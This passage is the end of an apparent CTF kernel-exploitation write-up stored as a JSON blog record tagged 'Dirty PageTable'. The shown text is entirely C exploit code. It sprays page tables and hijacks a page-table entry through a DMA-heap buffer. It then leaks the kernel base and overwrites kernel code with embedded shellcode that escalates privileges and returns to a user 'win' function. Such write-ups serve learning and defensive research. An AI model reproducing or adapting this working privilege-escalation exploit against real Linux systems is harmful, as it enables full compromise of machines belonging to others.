 &#125;    for(int i = 0; i &lt; SPRAY_FILE_NUM; i++)&#123;        if(victim_idx == i) continue;        close(file_fd[i]);    &#125;    for(int i = 0; i &lt; SPRAY_PGTABLE_NUM/2; i++)&#123;        for(int j = 0; j &lt; 8; j++)&#123;            spray_page[i][j*0x1000/8] = i+j;        &#125;    &#125;    struct dma_heap_allocation_data data;    data.len = 0x1000;    data.fd_flags = O_RDWR;    data.heap_flags = 0;    data.fd = 0;    if (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; 0) &#123;        puts(&quot;[x] DMA_HEAP_IOCTL_ALLOC&quot;);    &#125;    int dma_buf_fd = data.fd;    for(int i = SPRAY_PGTABLE_NUM/2; i &lt; SPRAY_PGTABLE_NUM; i++)&#123;        for(int j = 0; j &lt; 8; j++)&#123;            spray_page[i][j*0x1000/8] = i+j;        &#125;    &#125;    getchar();    puts(&quot;[*] step4 dup fd and find victim page&quot;);    for(int i = 0; i&lt; 0x1000; i++)&#123;        dup(file_fd[victim_idx]);    &#125;    for(int i = 0; i &lt; SPRAY_PGTABLE_NUM/2; i++)&#123;        for(int j = 0; j &lt; 8; j++)&#123;            if(spray_page[i][j*0x1000/8] != (ull)(i+j))&#123;                victim_page = &amp;spray_page[i][j*0x1000/8];                printf(&quot;[+] Found victim page %llx\\n&quot;, victim_page);                break;            &#125;        &#125;        if(victim_page != (ull*)-1)            break;    &#125;    getchar();    puts(&quot;[*] step5 munmap victim page and dma-heap mmap victim page addr&quot;);    munmap(victim_page, 0x1000);    ull* dmabuf = mmap((void *)victim_page, 0x1000, PROT_READ | PROT_WRITE,                    MAP_SHARED, dma_buf_fd, 0);    dmabuf[0] = 0x114514;    for(;;)&#123;        for(int i = 0; i&lt; 0x1000; i++)&#123;            dup(file_fd[victim_idx]);        &#125;        if((victim_page[0] &amp; 0xfff) == 0x867)&#123;            puts(&quot;[+] success control pagetable&quot;);            break;        &#125;    &#125;    puts(&quot;[*] step6 search victim page and leak kbase&quot;);    dmabuf[0] = 0x800000000009c867;    victim_page = (ull*)-1;    for(int i = SPRAY_PGTABLE_NUM/2; i &lt; SPRAY_PGTABLE_NUM; i++)&#123;        for(int j = 0; j &lt; 8; j++)&#123;            if((spray_page[i][j*0x1000/8] &amp; 0xff00) == 0x4000)&#123;                victim_page = &amp;spray_page[i][j*0x1000/8];                printf(&quot;[+] Found victim page %llx\\n&quot;, victim_page);                kbase = (spray_page[i][j*0x1000/8] &amp; ~0xff) - 0x3a04000;                printf(&quot;[+] get kbase %llx\\n&quot;, kbase);                break;            &#125;        &#125;        if(victim_page != (ull*)-1)            break;    &#125;    puts(&quot;[*] step7 arbitraty write and read&quot;);    ull link_addr = 0x42cc40 + kbase;    dmabuf[0] = 0x8000000000000867 | (link_addr &amp; ~0xfff);    char shellcode[] = &#123;0xf3,0x0f,0x1e,0xfa,0xe8,0x00,0x00,0x00,0x00,0x41,0x5f,0x49,0x81,0xef,        0x49,0xcc,0x42,0x00,0x49,0x8d,0xbf,0x00,0x6b,0xa7,0x02,0x49,0x8d,0x87,        0x70,0x26,0x1c,0x00,0xff,0xd0,0xbf,0x01,0x00,0x00,0x00,0x49,0x8d,0x87,        0xa0,0x8f,0x1b,0x00,0xff,0xd0,0x48,0x89,0xc7,0x49,0x8d,0xb7,0xc0,0x68,        0xa7,0x02,0x49,0x8d,0x87,0xd0,0x0a,0x1c,0x00,0xff,0xd0,0x49,0x8d,0xbf,        0x20,0x53,0xbb,0x02,0x49,0x8d,0x87,0xf0,0xc0,0x45,0x00,0xff,0xd0,0x48,        0x89,0xc3,0x48,0xbf,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x49,0x8d,        0x87,0xa0,0x8f,0x1b,0x00,0xff,0xd0,0x48,0x89,0x98,0x28,0x08,0x00,0x00,        0x31,0xc0,0x48,0x89,0x04,0x24,0x48,0x89,0x44,0x24,0x08,0x48,0xb8,0x22,        0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x48,0x89,0x44,0x24,0x10,0x48,0xb8,        0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x48,0x89,0x44,0x24,0x18,0x48,        0xb8,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x48,0x89,0x44,0x24,0x20,        0x48,0xb8,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x48,0x89,0x44,0x24,        0x28,0x48,0xb8,0x66,0x66,0x66,0x66,0x66,0x66,0x66,0x66,0x48,0x89,0x44,        0x24,0x30,0x49,0x8d,0x87,0xc6,0x11,0x40,0x01,0xff,0xe0,0xcc&#125;;    ull* p;    p = memmem(shellcode, sizeof(shellcode), &quot;\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11&quot;, 8);    p[0] = getpid();    p = memmem(shellcode, sizeof(shellcode), &quot;\\x22\\x22\\x22\\x22\\x22\\x22\\x22\\x22&quot;, 8);    p[0] = (ull)&amp;win;    p = memmem(shellcode, sizeof(shellcode), &quot;\\x33\\x33\\x33\\x33\\x33\\x33\\x33\\x33&quot;, 8);    p[0] = user_cs;    p = memmem(shellcode, sizeof(shellcode), &quot;\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44&quot;, 8);    p[0] = user_rflags;    p = memmem(shellcode, sizeof(shellcode), &quot;\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55&quot;, 8);    p[0] = user_sp;    p = memmem(shellcode, sizeof(shellcode), &quot;\\x66\\x66\\x66\\x66\\x66\\x66\\x66\\x66&quot;, 8);    p[0] = user_ss;    memcpy(victim_page+(link_addr &amp; 0xfff)/8, shellcode, sizeof(shellcode));    if (prctl(PR_SET_NAME, &quot;WHAT_CAN_I_SAY!&quot;, 0, 0, 0) != 0) &#123;        puts(&quot;[x] prctl error&quot;);    &#125;    printf(&quot;%d\\n&quot;, symlink(&quot;/exp&quot;, &quot;/tmp/exp&quot;));    getchar();    &#125;\n\n","categories":["ctf","wp"],"tags":["Dirty PageTable","kernel"]}]